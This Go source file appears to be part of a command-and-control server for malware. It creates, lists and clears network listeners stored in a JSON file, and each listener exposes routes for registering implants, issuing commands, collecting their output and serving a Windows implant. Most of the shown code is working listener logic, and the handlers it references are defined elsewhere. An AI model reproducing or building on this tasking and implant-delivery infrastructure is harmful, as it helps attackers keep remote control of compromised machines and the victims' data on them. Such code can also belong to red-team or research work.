package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
)

var activeListeners = make(map[string]net.Listener)

func entryExists(newListener Listener, existingListeners []Listener) bool {
	for _, listener := range existingListeners {
		if listener.Name == newListener.Name && listener.IP == newListener.IP && listener.Port == newListener.Port {
			return true
		}
	}
	return false
}

func createListener(w http.ResponseWriter, r *http.Request) {
	decoder := json.NewDecoder(r.Body)
	defer r.Body.Close()

	var newListener Listener
	err := decoder.Decode(&newListener)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	filePath := "ListenerEntries/listeners.json"

	var wrapper ListenerWrapper
	fileContent, err := ioutil.ReadFile(filePath)

	if os.IsNotExist(err) || len(fileContent) == 0 {
		wrapper.Listeners = []Listener{}
	} else if err != nil {
		log.Println("Error reading the file:", err)
		return
	} else {
		if err = json.Unmarshal(fileContent, &wrapper); err != nil {
			log.Println("Error while unmarshalling file:", err)
			return
		}
	}

	if entryExists(newListener, wrapper.Listeners) {
		http.Error(w, "Entry already exists", http.StatusBadRequest)
		return
	}

	wrapper.Listeners = append(wrapper.Listeners, newListener)

	updatedContent, err := json.Marshal(wrapper)
	if err != nil {
		log.Println("Error while marshaling:", err)
		return
	}

	if err := ioutil.WriteFile(filePath, updatedContent, 0644); err != nil {
		log.Println("Error while writing to file:", err)
	}
	serverPort := newListener.Port
	listenerAddress := ":" + serverPort

	ln, err := net.Listen("tcp", listenerAddress)
	if err != nil {
		log.Printf("Failed to start listener on %s: %v\n", listenerAddress, err)
		http.Error(w, "Failed to start listener", http.StatusInternalServerError)
		return
	}

	// Safely add the listener to the global map
	mu.Lock()
	activeListeners[listenerAddress] = ln
	mu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/registerNewImplant", registerNewImplant)
	mux.HandleFunc("/getCommand", getCommand)
	mux.HandleFunc("/postOutput", postOutput)
	mux.HandleFunc("/agents/windows/cs", windowsImplant)

	go func() {
		defer ln.Close()
		fmt.Printf("Starting server at %s\n", listenerAddress)
		if err := http.Serve(ln, mux); err != nil {
			log.Printf("Failed to serve on %s: %v\n", listenerAddress, err)
		}
	}()

	alert("New Listener created")
}

func getListeners(w http.ResponseWriter, r *http.Request) {
	filePath := "ListenerEntries/listeners.json"

	var listenersWrapper ListenerWrapper

	// Read the existing JSON content from the file
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		http.Error(w, "Error while reading the file: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Unmarshal it to the ListenerWrapper struct
	if err := json.Unmarshal(fileContent, &listenersWrapper); err != nil {
		http.Error(w, "Error while unmarshalling: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Marshal the struct to JSON byte array for sending it as a response
	listenerEntries, err := json.Marshal(listenersWrapper)
	if err != nil {
		http.Error(w, "Error while marshaling: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Send the JSON content as HTTP response
	w.Header().Set("Content-Type", "application/json")
	w.Write(listenerEntries)
}

func clearListeners(w http.ResponseWriter, r *http.Request) {
	filePath := "ListenerEntries/listeners.json"
	empty_listeners := "{\"Listeners\":[]}"

	// Close all active listeners
	mu.Lock()
	for address, listener := range activeListeners {
		if err := listener.Close(); err != nil {
			log.Printf("Failed to close listener on %s: %v\n", address, err)
			// Decide whether to continue or return based on your error handling policy
		}
		delete(activeListeners, address)
	}
	mu.Unlock()

	// Remove the file if it exists
	if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
		log.Println("Error while removing file:", err)
		return
	}

	// Create the file again
	file, err := os.Create(filePath)
	if err != nil {
		log.Println("Error while creating file:", err)
		return
	}
	defer file.Close()

	// Write the empty_listeners content back to the file
	if _, err := file.WriteString(empty_listeners); err != nil {
		log.Println("Error while writing to file:", err)
	}

	fmt.Println("Listeners have been cleared.")
	alert("Listeners have been cleared.")
}
